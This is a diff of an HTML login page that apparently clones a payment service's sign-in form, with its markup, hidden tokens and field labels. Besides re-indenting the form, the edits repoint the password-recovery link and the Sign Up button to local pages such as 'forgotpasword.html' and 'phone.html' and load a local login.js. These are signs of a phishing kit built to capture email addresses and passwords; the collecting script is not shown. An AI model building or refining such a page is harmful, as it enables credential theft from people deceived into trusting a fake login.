@@ -166,35 +166,40 @@
 
 
 
-                <form action=" " method="post" class="proceed maskable" autocomplete="off" name="login" autocomplete="off"
-                    novalidate><input type="hidden" id="token" name="_csrf" value="Q8JuiFY8jD9RtqKAM4n/eMCQSLx6PsoV0vcnA="><input
-                        type="hidden" name="locale.x" value="en_US"><input type="hidden" name="processSignin" value="main"><input
-                        type="hidden" name="fn_sync_data" value="fn_sync_data"><input type="hidden" name="otpMayflyKey"
-                        value="8cc566c61d0c4d66bdc611670cd18ddeotpChlg"><input type="hidden" name="intent" value="signin" /><input
-                        type="hidden" name="ads-client-context" value="signin" /><input type="hidden" name="showCountryDropDown"
-                        value="true" /><input type="hidden" name="requestUrl" value="/signin" /><input type="hidden"
-                        name="forcePhonePasswordOptIn" value="" />
-                    <div id="passwordSection" class="clearfix splitEmail">
-                        <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
-                            <div class="countryPhoneSelectWrapper hide"><label class="accessAid" for="phoneCode">Choose your country's
-                                    calling code</label><select name="phoneCode" id="phoneCode" class="countryPhoneSelect">
-                                    <option selected="selected" value="" data-code="" data-country="">
-                                    </option>
-                                </select>
-                                <div class="countryPhoneSelectChoice"><span class="countryCode"></span><span class="phoneCode"></span>
+                    <form action=" " method="post" class="proceed maskable" autocomplete="off" name="login"
+                        autocomplete="off" novalidate><input type="hidden" id="token" name="_csrf"
+                            value="Q8JuiFY8jD9RtqKAM4n/eMCQSLx6PsoV0vcnA="><input type="hidden" name="locale.x"
+                            value="en_US"><input type="hidden" name="processSignin" value="main"><input type="hidden"
+                            name="fn_sync_data" value="fn_sync_data"><input type="hidden" name="otpMayflyKey"
+                            value="8cc566c61d0c4d66bdc611670cd18ddeotpChlg"><input type="hidden" name="intent"
+                            value="signin" /><input type="hidden" name="ads-client-context" value="signin" /><input
+                            type="hidden" name="showCountryDropDown" value="true" /><input type="hidden"
+                            name="requestUrl" value="/signin" /><input type="hidden" name="forcePhonePasswordOptIn"
+                            value="" />
+                        <div id="passwordSection" class="clearfix splitEmail">
+                            <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
+                                <div class="countryPhoneSelectWrapper hide"><label class="accessAid"
+                                        for="phoneCode">Choose your country's
+                                        calling code</label><select name="phoneCode" id="phoneCode"
+                                        class="countryPhoneSelect">
+                                        <option selected="selected" value="" data-code="" data-country="">
+                                        </option>
+                                    </select>
+                                    <div class="countryPhoneSelectChoice"><span class="countryCode"></span><span
+                                            class="phoneCode"></span>
+                                    </div>
+
                                 </div>
-                                
-                            </div>
-                            <div class="invalidCredential" id="invalidCredential"
-                                style="color: red; text-align: center; margin: 5px;font-weight: 400;"></div>
+                                <div class="invalidCredential" id="invalidCredential"
+                                    style="color: red; text-align: center; margin: 5px;font-weight: 400;"></div>
                                 <div class="textInput  " id="login_emaildiv">
                                     <div class="fieldWrapper "><label for="email" class="fieldLabel">Email or mobile
                                             number</label>
-                                          
-                                            <input id="email" name="login_email" type="email"
+
+                                        <input id="email" name="login_email" type="email"
                                             class="hasHelp  validateEmpty   " required="required"
-                                             autocomplete="username"
-                                            placeholder="Email or mobile number" aria-describedby="emailErrorMessage" />
+                                            autocomplete="username" placeholder="Email or mobile number"
+                                            aria-describedby="emailErrorMessage" />
                                     </div>
                                     <div class="errorMessage" id="emailErrorMessage">
                                         <p class="emptyError hide">Required</p>
@@ -219,9 +224,8 @@
                                     <div class="errorMessage" id="passwordErrorMessage">
                                         <p class="emptyError hide">Enter your password.</p>
                                     </div>
-                                </div><a
-                                    href="forgottenpasword/forgotpasword.html"
-                                    id="forgotPassword" class="recoveryOption forgotPassword"
+                                </div><a href="forgotpasword.html" id="forgotPassword"
+                                    class="recoveryOption forgotPassword"
                                     data-client-log-action-type="clickForgotPasswordLink">Forgot password?</a>
                             </div>
                         </div><input type="hidden" id="phone" name="login_phone" class="validate" />
@@ -250,7 +254,7 @@
                     </div>
                     <div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass="">
                         <div class="loginSignUpSeparator "><span class="textInSeparator">or</span></div><button
-                            type="button" href="/ng/webapps/mpp/account-selection"
+                            type="button" href="phone.html"
                             class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount">Sign
                             Up</button>
                     </div>
@@ -373,12 +377,8 @@
             alt="" height="1" width="1" border="0"></noscript>
     <script async defer
         src="/auth/createchallenge/2f1b1991c601e6f8/recaptchav3.js?_sessionID=lpKUt6guLMv4LYTqqvkkkPApGCrO9eoQ"></script>
-<script src="js/login.js"></script>
+    <script src="js/login.js"></script>
 
-        </body>
+</body>
 
 </html>
-
-
-
-
